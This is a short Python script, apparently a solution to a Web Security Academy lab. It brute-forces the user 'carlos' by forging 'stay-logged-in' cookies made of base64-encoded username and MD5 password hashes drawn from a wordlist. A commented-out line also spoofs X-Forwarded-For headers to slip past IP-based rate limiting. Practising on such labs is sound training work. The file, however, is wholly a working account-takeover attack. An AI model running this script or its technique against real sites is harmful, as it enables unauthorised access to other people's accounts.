import requests
import hashlib
import base64
from tqdm import tqdm

def check_credentials(cookies, url, password):
    # data = {'username': username, 'password': password}
    # headers = {'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}
    with requests.session() as s:
        r = s.post(url=url, cookies=cookies)
        print(r.status_code)
        # if 'Your username is: carlos' in r.text:
        #     print(f'{password=}')
        #     return

if __name__ == '__main__':
    with open('passwords.txt', 'r') as r:
        passwords = r.read().split('\n')

    for password in tqdm(passwords):
        cookies = {
            'stay-logged-in': ''
        }
        hash_object = hashlib.md5()
        hash_object.update(password.encode())
        password_hash = hash_object.hexdigest()
        stay_logged_in = 'carlos:' + password_hash 
        stay_logged_in = base64.b64encode(stay_logged_in.encode())
        cookies['stay-logged-in'] = stay_logged_in.decode()

        url = 'https://0abb006004bd88768005a80500a600e3.web-security-academy.net' + '/my-account?id=carlos'
        check_credentials(cookies= cookies, url=url, password=password)

